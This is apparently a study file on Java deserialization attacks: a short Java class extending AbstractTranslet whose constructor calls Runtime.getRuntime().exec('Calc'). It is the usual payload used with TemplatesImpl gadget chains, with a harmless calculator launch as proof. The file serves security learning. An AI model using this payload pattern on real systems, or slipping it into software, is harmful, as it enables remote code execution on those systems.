package src.DynamicClassLoader.TemplatesImplClassLoader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

// TemplatesImpl 的字节码构造
public class TemplatesBytes extends AbstractTranslet {
    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}
    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
    public TemplatesBytes() throws IOException{
        super();
        Runtime.getRuntime().exec("Calc");
    }
}
